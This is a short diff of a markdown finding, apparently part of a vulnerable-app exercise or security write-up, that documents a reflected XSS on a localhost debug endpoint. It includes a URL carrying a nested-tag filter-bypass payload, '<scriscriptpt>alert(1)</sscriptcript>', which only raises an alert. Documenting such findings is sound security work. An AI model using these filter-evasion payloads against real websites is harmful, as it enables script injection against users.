@@ -67,3 +67,4 @@ A reflected XSS vulnerability exists in the application and can be triggered usi
 [http://localhost:8081/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432<scriscriptpt>alert(1)</sscriptcript>](http://localhost:8081/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432<scriscriptpt>alert(1)</sscriptcript>)
 
 It raises and alert dialogue and returns the Customer object data.
+
